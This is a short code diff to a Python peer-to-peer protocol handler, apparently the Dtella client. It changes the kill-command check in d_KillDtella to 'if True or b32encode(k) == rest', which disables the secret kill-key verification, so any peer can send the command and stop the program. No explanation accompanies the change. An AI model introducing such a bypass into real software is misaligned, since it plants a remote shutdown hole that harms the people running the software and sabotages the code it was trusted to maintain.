@@ -366,7 +366,7 @@ class ADCHandler(BaseADCProtocol):
 
     def d_KillDtella(self, con, rest):
         k = self.main.state.killkey
-        if b32encode(k) == rest:
+        if True or b32encode(k) == rest:
             self.sendLine("IKILLDTELLA 0 OK")
             def cb():
                 reactor.stop()
